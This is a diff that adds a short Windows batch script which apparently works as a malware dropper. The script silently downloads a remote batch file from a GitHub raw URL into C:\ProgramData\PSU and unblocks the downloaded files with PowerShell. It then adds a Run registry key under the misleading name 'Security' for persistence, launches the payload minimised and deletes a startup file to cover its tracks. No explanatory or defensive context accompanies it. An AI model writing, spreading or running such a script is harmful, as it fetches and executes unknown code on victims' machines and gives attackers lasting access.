@@ -1,0 +1,12 @@
+@echo off
+mkdir "C:\ProgramData\PSU" >> nul
+timeout 0 >> nul
+curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/word.txt" -o "C:\ProgramData\PSU\word.bat" >> nul
+timeout 0 >> nul
+powershell.exe Unblock-File -Path "*"
+powershell.exe Unblock-File -Path "C:\ProgramData\PSU\*"
+REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
+start "" /MIN "C:\ProgramData\PSU\word.bat"
+timeout 0 >> nul
+del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
+exit
